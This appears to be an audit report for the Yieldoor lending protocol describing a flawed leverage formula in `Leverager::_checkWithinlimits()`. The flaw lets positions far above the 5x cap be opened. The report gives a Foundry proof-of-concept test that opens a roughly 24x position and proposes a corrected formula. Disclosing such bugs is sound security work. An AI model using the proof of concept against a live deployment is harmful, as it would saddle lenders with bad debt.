# Leverage is incorrectly calculated and allows users to create almost liquidatable positions at little cost

### Summary

`Leverager::_checkWithinlimits()` calculates the leverage as follows:
```solidity
function _checkWithinlimits(Position memory up) internal {
    VaultParams memory vp = vaultParams[up.vault];
    (uint256 maxIndividualBorrow, uint256 maxLevTimes) =
        ILendingPool(lendingPool).getLeverageParams(up.denomination);

    uint256 positionLeverage = (up.initCollateralValue + up.borrowedAmount) * 1e18 / up.initCollateralValue;
    ...
}
```
Here, `up.initCollateralValue` is the full value of the position, not the initial collateral, so for example if the user deposits 100 collateral and borrows 1000 to have a position of 1100, the leverage would be (1100 + 1000) / 1100 = 1.9, which is wrong. Additionally, the bigger the real leverage (borrow), the more the wrong leverage calculation tends to 2, which means technically any leverage is allowed.

### Root Cause

In `Leverager:464`, the leverage [calculation](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Leverager.sol#L464) is incorrect.

### Internal Pre-conditions

None.

### External Pre-conditions

None.

### Attack Path

1. User opens a leverage position with way more leverage than allowed.

### Impact

The protocol sets max leverage to 5 in the tests, but this allows any big leverage to be used, creating a huge amount of bad debt taking the lending pool or the protocol huge losses.

### PoC

The following test shows that a position can be opened with 24x leverage when the limit was 5.
```solidity
function test_POC_WrongLeverage() external {
    vm.startPrank(lender);
    wbtc.approve(lendingPool, 10e8);
    deal(address(wbtc), lender, 10e8);

    ILendingPool(lendingPool).deposit(address(wbtc), 10e8, lender);

    usdc.approve(lendingPool, 1e6*1e6);
    deal(address(usdc), lender, 1e6*1e6);

    ILendingPool(lendingPool).deposit(address(usdc), 1e6*1e6, lender);

    uint256 borrowingRate = ILendingPool(lendingPool).borrowingRateOfReserve(address(wbtc));
    assertEq(borrowingRate, 0);

    skip(6 minutes);

    vm.startPrank(depositor);
    ILeverager.LeverageParams memory lp;
    lp.amount0In = 1e7; //@audit 10x leverage
    lp.amount1In = 10_000e6;
    lp.vault0In = 1e8;
    lp.vault1In = 100_000e6;
    lp.vault = vault;
    lp.maxBorrowAmount = 10e8;
    lp.denomination = address(wbtc);

    bytes memory _path = abi.encodePacked(address(usdc), uint24(3000), address(wbtc));
    IMainnetRouter.ExactOutputParams memory ep;
    ep.path = _path;
    ep.deadline = block.timestamp;
    ep.amountInMaximum = type(uint256).max;
    ep.recipient = leverager;
    lp.swapParams2 = abi.encode(ep);

    deal(address(wbtc), depositor, 1e7);
    deal(address(usdc), depositor, 10_000e6);
    wbtc.approve(leverager, type(uint256).max);
    usdc.approve(leverager, type(uint256).max);

    ILeverager(leverager).openLeveragedPosition(lp);

    ILeverager.Position memory pos = ILeverager(leverager).getPosition(1);
    assertEq(pos.initCollateralValue, 2e8);
    assertEq(pos.borrowedAmount, 1.91941098e8);
    assertEq((pos.initCollateralValue + pos.borrowedAmount) * 1e18 / pos.initCollateralValue, 1.95970549e18);
}

```

### Mitigation

`uint256 positionLeverage = up.initCollateralValue * 1e18 / (up.initCollateralValue - up.borrowedAmount); `
